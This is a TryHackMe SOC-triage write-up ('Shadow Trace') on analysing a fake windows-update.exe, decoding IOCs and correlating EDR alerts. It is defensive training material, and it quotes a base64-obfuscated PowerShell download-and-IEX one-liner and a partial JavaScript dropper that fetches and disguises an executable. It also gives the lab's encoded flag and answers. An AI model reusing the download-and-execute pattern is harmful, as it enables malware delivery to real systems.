# Shadow Trace

## Room Overview
Mid-night shift, sole analyst on SOC. A suspicious file is found on a user's machine and escalated for review. The EDR fires critical alerts at the same time. Objective: analyze the binary, extract IOCs, correlate alerts, and contain before further spread.

## Category
- Malware Triage / Alert Correlation

## Objective
- Extract IOCs from suspicious binary
- Correlate EDR alerts with malicious activity
- Perform SOC triage actions

## Tools & Environment
- TryHackMe AttackBox
- PEStudio
- CyberChef

## Investigation Process
Opened `windows-update.exe` in PEStudio. Architecture and SHA256 pulled from the Details tab. Indicators tab surfaced an embedded URL. Strings tab revealed `responses[.]tryhatme[.]com` and an encoded flag at `tryhatme[.]com/VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=`, decoded via CyberChef. Libraries tab confirmed `WS2_32.dll` loaded, indicating network socket capability.

Two critical EDR alerts on `WIN-SRV-01.tryhackme.local / CORPsvc_backup`:

**Alert 1, 18:24, PowerShell:**
```powershell
(new-object system.net.webclient).DownloadString(
[Text.Encoding]::UTF8.GetString(
[Convert]::FromBase64String("aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl")))
| IEX
```
Base64 decoded in CyberChef resolves to `hxxps[://]tryhatme[.]com/dev/main[.]exe`, pulled and executed in memory via IEX.

**Alert 2, 19:24, Chrome JavaScript:**
```javascript
fetch([104,116,116,...].map(c=>String.fromCharCode(c)).join(''))
.then(r=>r.blob()).then(b=>{...a.download='test.txt'...})
```
Charcode array decoded via CyberChef (From Decimal, comma delimiter) resolves to `hxxps[://]reallysecureupdate[.]tryhatme[.]com/update[.]exe`. Binary fetched and saved locally as `test.txt`, a dropper disguising a malicious executable with a benign filename.

## Findings
- **Binary:** `windows-update.exe`
- **SHA256:** `b2a88de3e3bcfae4a4b38fa36e884c586b5cb2c2c283e71fba59efdb9ea64bfc`
- **Embedded URL:** `hxxp[://]tryhatme[.]com/update/security-update[.]exe`
- **C2 domain:** `responses[.]tryhatme[.]com`
- **PowerShell payload:** `hxxps[://]tryhatme[.]com/dev/main[.]exe`
- **Chrome dropper:** `hxxps[://]reallysecureupdate[.]tryhatme[.]com/update[.]exe`, saved as `test.txt`
- **Network indicator:** `WS2_32.dll` loaded, active socket communication

## Analysis & Response
- Isolate `WIN-SRV-01` via EDR
- Block all identified domains at the perimeter
- Investigate the `CORPsvc_backup` account. A service account executing PowerShell and browser JS is a red flag for compromise or abuse
- Escalate and report findings

## MITRE ATT&CK
- Masquerading (T1036): `windows-update.exe` disguised as a legitimate Windows binary
- Obfuscated Files or Information (T1027): encoded URLs and payloads
- Deobfuscate/Decode (T1140): Base64 and charcode used to conceal malicious URLs
- PowerShell (T1059.001): used to download and execute the payload in memory
- JavaScript (T1059.007): Chrome JS execution used to fetch and drop the malicious binary
- Ingress Tool Transfer (T1105): malicious executables pulled from C2

## Key Takeaways
- PEStudio extracts architecture, hash, URLs, and libraries in a single pass. First tool on any suspicious binary.
- CyberChef charcode decoding requires "From Decimal" with a comma delimiter, not "From Charcode".
- `WS2_32.dll` in imports signals network communication capability.
- Executables disguised with benign filenames (`update.exe` → `test.txt`) are a common defense evasion technique.
